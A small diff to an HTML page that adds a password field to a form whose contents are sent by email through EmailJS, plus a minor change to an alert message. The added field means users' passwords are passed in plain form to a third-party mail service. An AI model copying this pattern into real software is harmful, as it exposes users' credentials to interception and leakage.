@@ -19,6 +19,7 @@ div {
 	</p>
 	<br>
 	<form id="myform" method="post">
+    	<input name="Password" style="font-family:courier" placeholder="Password" type="password" />
 		<button>📧</button>
 	</form>
 </div>
@@ -41,7 +42,7 @@ div {
     myform.find("button").text("💨");
     emailjs.sendForm(service_id,template_id,"myform")
       .then(function(){ 
-      alert("Check your inbox");
+      alert("Check your inbox!");
       myform.find("button").text("📧");
     }, function(err) {
       alert("Send email failed!\r\n Response:\n " + JSON.stringify(err));
@@ -51,4 +52,3 @@ div {
   });
 </script>
 </head>
-
